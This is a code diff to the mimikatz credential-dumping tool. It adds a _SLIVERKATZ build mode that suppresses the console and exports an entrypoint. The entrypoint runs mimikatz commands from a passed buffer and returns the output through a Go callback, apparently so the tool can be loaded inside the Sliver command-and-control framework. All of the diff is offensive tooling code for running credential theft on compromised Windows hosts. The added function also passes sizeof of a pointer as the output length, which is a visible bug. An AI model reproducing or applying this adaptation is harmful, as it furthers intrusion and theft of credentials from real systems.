@@ -39,7 +39,7 @@ int wmain(int argc, wchar_t * argv[])
 {
 	NTSTATUS status = STATUS_SUCCESS;
 	int i;
-#if !defined(_POWERKATZ)
+#if !defined(_POWERKATZ) && !defined(_SLIVERKATZ)
 	size_t len;
 	wchar_t input[0xffff];
 #endif
@@ -49,7 +49,7 @@ int wmain(int argc, wchar_t * argv[])
 		kprintf(L"\n" MIMIKATZ L"(" MIMIKATZ_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
 		status = mimikatz_dispatchCommand(argv[i]);
 	}
-#if !defined(_POWERKATZ)
+#if !defined(_POWERKATZ) && !defined(_SLIVERKATZ)
 	while ((status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING))
 	{
 		kprintf(L"\n" MIMIKATZ L" # "); fflush(stdin);
@@ -69,7 +69,7 @@ int wmain(int argc, wchar_t * argv[])
 void mimikatz_begin()
 {
 	kull_m_output_init();
-#if !defined(_POWERKATZ)
+#if !defined(_POWERKATZ) && !defined(_SLIVERKATZ)
 	SetConsoleTitle(MIMIKATZ L" " MIMIKATZ_VERSION L" " MIMIKATZ_ARCH L" (oe.eo)");
 	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
 #endif
@@ -86,7 +86,7 @@ void mimikatz_begin()
 void mimikatz_end(NTSTATUS status)
 {
 	mimikatz_initOrClean(FALSE);
-#if !defined(_POWERKATZ)
+#if !defined(_POWERKATZ) && !defined(_SLIVERKATZ)
 	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
 #endif
 	kull_m_output_clean();
@@ -118,7 +118,7 @@ NTSTATUS mimikatz_initOrClean(BOOL Init)
 		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
 		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
 		if(FAILED(hr))
-#if defined(_POWERKATZ)
+#if defined(_POWERKATZ) || (_SLIVERKATZ)
 			if(hr != RPC_E_CHANGED_MODE)
 #endif
 				PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
@@ -252,6 +252,35 @@ __declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input)
 		LocalFree(argv);
 	}
 	return outputBuffer;
+}
+#endif
+
+#if defined(_SLIVERKATZ)
+__declspec(dllexport) int __cdecl entrypoint(char* argsBuffer, SIZE_T bufferSize, goCallback callback) {
+	int argc = 0;
+	wchar_t** argv;
+	wchar_t* input;
+
+	input = malloc(sizeof(wchar_t) * bufferSize + 2);
+	memset(input, 0x0, sizeof(wchar_t) * bufferSize + 2);
+	mbstowcs(input, argsBuffer, bufferSize);
+
+	if (argv = CommandLineToArgvW(input, &argc))
+	{
+		outputBufferElements = 0xff;
+		outputBufferElementsPosition = 0;
+		if (outputBuffer = (wchar_t*)LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
+			wmain(argc, argv);
+		LocalFree(argv);
+	}
+	char* output = NULL;
+	output = malloc(sizeof(char) * (outputBufferElements + 2));
+	memset(output, 0x0, sizeof(char) * (outputBufferElements + 2));
+	wcstombs(output, outputBuffer, sizeof(char) * (outputBufferElements + 2));
+	callback(output, sizeof(output));
+	free(output);
+	free(input);
+	return 1;
 }
 #endif
 
